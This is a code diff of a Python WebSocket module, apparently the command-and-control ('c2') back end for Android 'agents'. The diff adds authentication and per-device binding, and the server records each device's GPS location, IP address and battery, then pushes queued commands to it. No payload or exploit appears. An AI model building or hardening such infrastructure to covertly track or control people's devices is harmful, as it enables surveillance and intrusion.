@@ -1,155 +1,273 @@
-"""WebSocket namespace for persistent agent connections."""
+"""WebSocket namespace for persistent agent connections.
+
+Trust model
+-----------
+A socket is *unauthenticated* the moment it connects. It has exactly one
+capability in that state: send ``hello``. Every other event from an
+unauthenticated socket is refused and the connection is dropped.
+
+Once authenticated the socket is pinned to a single ``device_id`` for its
+whole lifetime, so it cannot touch another device's state or commands even
+though it holds the shared key.
+"""
 
 from __future__ import annotations
 
 import json
-from datetime import datetime
 
 from flask import request
-from flask_socketio import emit, join_room, leave_room
+from flask_socketio import ConnectionRefusedError, disconnect, emit, join_room
 
-from database import db
-from models import Device, Command, CapturedFile, LogEntry
-from config import Config
-from c2.file_handler import persist_upload
+from c2.auth import agent_key_ok
+from c2.timeutil import utcnow
 from c2.ws_dashboard import broadcast, socketio
+from database import db
+from models import Command, Device
+
+RESULT_MAX_CHARS = 512 * 1024
+
+# device_id -> sid
+_agents: dict[str, str] = {}
+# sid -> device_id (authenticated sockets only)
+_sid_devices: dict[str, str] = {}
 
 
-_agents = {}
+def _auth_sid() -> str | None:
+    """device_id this socket is authenticated as, or None."""
+    return _sid_devices.get(request.sid)
+
+
+def _require_auth():
+    """Return the bound device_id, or None after dropping the socket.
+
+    Raising ConnectionRefusedError only works from the ``connect`` handler.
+    In a data handler it escapes as an unhandled server exception, so the
+    clean way to kick an unauthorised client is ``disconnect()``.
+    """
+    device_id = _auth_sid()
+    if not device_id:
+        disconnect()
+        return None
+    return device_id
 
 
 def register_agent_ws():
-    """Attach the /agent namespace handlers. Call once at app startup."""
-
     @socketio.on("connect", namespace="/agent")
     def on_agent_connect(auth=None):
-        # Auth may come via handshake auth or via explicit hello
-        a = auth or {}
-        key = a.get("api_key", "")
-        device_id = a.get("device_id", "")
-        if key == Config.API_KEY and device_id:
-            _register(device_id, a)
-            emit("accept", {"device_id": device_id, "commands": _pending(device_id)})
+        a = auth if isinstance(auth, dict) else {}
+        key = a.get("api_key") or request.args.get("api_key", "")
+        device_id = a.get("device_id") or ""
+
+        if not agent_key_ok(key) or not device_id:
+            # Refuse the upgrade outright when the client can authenticate in
+            # the handshake. Clients that cannot stay connected but
+            # unauthenticated and must send `hello`.
+            if device_id:
+                print("[agent] rejected: bad key or missing device_id", flush=True)
+                raise ConnectionRefusedError("unauthorized")
+            print("[agent] anonymous connect, awaiting hello", flush=True)
             return True
-        # Otherwise wait for hello
-        emit("agent_welcome", {"ok": True})
+
+        _bind(device_id, a)
+        emit("accept", {"device_id": device_id, "commands": _drain(device_id)})
+        print(f"[agent] accepted {device_id}", flush=True)
         return True
 
     @socketio.on("hello", namespace="/agent")
     def on_agent_hello(data):
-        a = data or {}
-        if a.get("api_key") != Config.API_KEY:
+        a = data if isinstance(data, dict) else {}
+        if not agent_key_ok(a.get("api_key")):
             emit("reject", {"error": "unauthorized"})
-            return False
+            disconnect()
+            return
+
         device_id = a.get("device_id")
         if not device_id:
             emit("reject", {"error": "missing_device_id"})
-            return False
-        _register(device_id, a)
-        emit("accept", {"device_id": device_id, "commands": _pending(device_id)})
+            disconnect()
+            return
+
+        _bind(device_id, a)
+        emit("accept", {"device_id": device_id, "commands": _drain(device_id)})
+        print(f"[agent] accepted via hello {device_id}", flush=True)
 
     @socketio.on("state", namespace="/agent")
     def on_agent_state(data):
-        device_id = (data or {}).get("device_id")
+        device_id = _require_auth()
         if not device_id:
             return
-        dev = Device.query.filter_by(device_id=device_id).first()
+        a = data if isinstance(data, dict) else {}
+
+        dev = db.session.query(Device).filter_by(device_id=device_id).first()
         if not dev:
+            disconnect()
             return
-        dev.last_seen = datetime.utcnow()
+
+        dev.last_seen = utcnow()
         dev.is_online = True
-        if data.get("battery") is not None:
-            dev.battery = data["battery"]
-        if data.get("latitude") is not None and data.get("longitude") is not None:
-            dev.latitude = data["latitude"]
-            dev.longitude = data["longitude"]
+        battery = a.get("battery")
+        if battery is not None:
+            try:
+                dev.battery = int(battery)
+            except (TypeError, ValueError):
+                pass
+        if a.get("latitude") is not None and a.get("longitude") is not None:
+            try:
+                dev.latitude = float(a["latitude"])
+                dev.longitude = float(a["longitude"])
+            except (TypeError, ValueError):
+                pass
         db.session.commit()
-        broadcast("device_update", dev.to_dict())
+        _emit_device(dev)
 
     @socketio.on("result", namespace="/agent")
     def on_agent_result(data):
-        cmd_id = (data or {}).get("command_id")
-        cmd = Command.query.get(cmd_id)
-        if not cmd:
+        device_id = _require_auth()
+        if not device_id:
             return
-        cmd.result = json.dumps(data.get("result", {}))[:1024 * 512]
-        cmd.status = "done" if data.get("success") else "failed"
-        cmd.completed_at = datetime.utcnow()
+        a = data if isinstance(data, dict) else {}
+
+        dev = db.session.query(Device).filter_by(device_id=device_id).first()
+        if not dev:
+            disconnect()
+            return
+
+        raw_id = a.get("command_id")
+        if raw_id is None:
+            return
+        try:
+            cmd_id = int(raw_id)
+        except (TypeError, ValueError):
+            return
+
+        cmd = db.session.get(Command, cmd_id)
+        # Sequential ids: existence alone is not authorisation.
+        if not cmd or cmd.device_id != dev.id:
+            emit("command_rejected", {"command_id": raw_id, "error": "not_yours"})
+            return
+
+        cmd.result = json.dumps(a.get("result", {}))[:RESULT_MAX_CHARS]
+        cmd.status = "done" if a.get("success") else "failed"
+        cmd.completed_at = utcnow()
         db.session.commit()
         broadcast("command_result", cmd.to_dict())
 
     @socketio.on("poll", namespace="/agent")
-    def on_agent_poll(data):
-        device_id = (data or {}).get("device_id")
+    def on_agent_poll(_data=None):
+        device_id = _require_auth()
         if not device_id:
             return
-        dev = Device.query.filter_by(device_id=device_id).first()
+
+        dev = db.session.query(Device).filter_by(device_id=device_id).first()
         if not dev:
             emit("commands", {"commands": []})
             return
-        dev.last_seen = datetime.utcnow()
+
+        dev.last_seen = utcnow()
+        dev.is_online = True
         db.session.commit()
-        emit("commands", {"commands": _pending(device_id)})
+        emit("commands", {"commands": _drain(device_id)})
 
     @socketio.on("disconnect", namespace="/agent")
-    def on_agent_disconnect():
+    def on_agent_disconnect(_reason=None):
         sid = request.sid
-        for did, s in list(_agents.items()):
-            if s == sid:
-                _agents.pop(did, None)
-                dev = Device.query.filter_by(device_id=did).first()
-                if dev:
-                    dev.is_online = False
-                    db.session.commit()
-                    broadcast("device_update", dev.to_dict())
-                break
+        device_id = _sid_devices.pop(sid, None)
+        if not device_id:
+            return
+
+        # Only clear the registry if this sid still owns the device; a stale
+        # socket disconnecting must not evict its live replacement.
+        if _agents.get(device_id) == sid:
+            _agents.pop(device_id, None)
+            dev = db.session.query(Device).filter_by(device_id=device_id).first()
+            if dev:
+                dev.is_online = False
+                db.session.commit()
+                _emit_device(dev)
+            print(f"[agent] disconnected {device_id}", flush=True)
 
 
-def _register(device_id, meta):
+def _bind(device_id: str, meta: dict) -> None:
+    previous = _agents.get(device_id)
+    if previous and previous != request.sid:
+        _sid_devices.pop(previous, None)
+
     _agents[device_id] = request.sid
+    _sid_devices[request.sid] = device_id
     join_room(f"agent_{device_id}")
 
-    dev = Device.query.filter_by(device_id=device_id).first()
+    dev = db.session.query(Device).filter_by(device_id=device_id).first()
     if not dev:
-        dev = Device(device_id=device_id)
+        dev = Device(device_id=device_id, first_seen=utcnow())
         db.session.add(dev)
 
     dev.model = meta.get("model") or dev.model
     dev.manufacturer = meta.get("manufacturer") or dev.manufacturer
     dev.android_version = meta.get("android_version") or dev.android_version
-    dev.sdk_int = meta.get("sdk_int") or dev.sdk_int
+    sdk = meta.get("sdk_int")
+    if sdk is not None:
+        try:
+            dev.sdk_int = int(sdk)
+        except (TypeError, ValueError):
+            pass
     dev.hostname = meta.get("hostname") or dev.hostname
     dev.ip_address = request.remote_addr
-    dev.last_seen = datetime.utcnow()
+    dev.last_seen = utcnow()
     dev.is_online = True
     db.session.commit()
 
+    _emit_device(dev)
+
+
+def _emit_device(dev: Device) -> None:
     broadcast("device_update", dev.to_dict())
+    broadcast("device_update", dev.to_dict(), room="all_devices")
+    broadcast("device_update", dev.to_dict(), room=f"device_{dev.id}")
 
 
-def _pending(device_id):
-    dev = Device.query.filter_by(device_id=device_id).first()
+def _drain(device_id: str) -> list[dict]:
+    """Hand pending commands to the agent and mark them delivered."""
+    dev = db.session.query(Device).filter_by(device_id=device_id).first()
     if not dev:
         return []
-    pending = Command.query.filter_by(device_id=dev.id, status="pending")\
-                           .limit(20).all()
+
+    pending = (Command.query.filter_by(device_id=dev.id, status="pending")
+               .order_by(Command.id.asc()).limit(20).all())
+    now = utcnow()
     for c in pending:
         c.status = "sent"
-        c.delivered_at = datetime.utcnow()
-    db.session.commit()
+        c.delivered_at = now
+    if pending:
+        db.session.commit()
+
     return [
         {"id": c.id, "type": c.command_type, "args": c.args()}
         for c in pending
     ]
 
 
+# --------------------------------------------------------------------------
+# Registry accessors
+# --------------------------------------------------------------------------
+
+
 def send_command_to_agent(device_id: str, command: dict) -> bool:
     sid = _agents.get(device_id)
-    if not sid:
+    if not sid or sid not in _sid_devices:
         return False
     socketio.emit("command", command, namespace="/agent", to=sid)
     return True
 
 
 def agent_online(device_id: str) -> bool:
-    return device_id in _agents
+    return _agents.get(device_id) in _sid_devices
+
+
+def connected_devices() -> set[str]:
+    return {d for d, s in _agents.items() if s in _sid_devices}
+
+
+def reset_registry() -> None:
+    """Test helper."""
+    _agents.clear()
+    _sid_devices.clear()
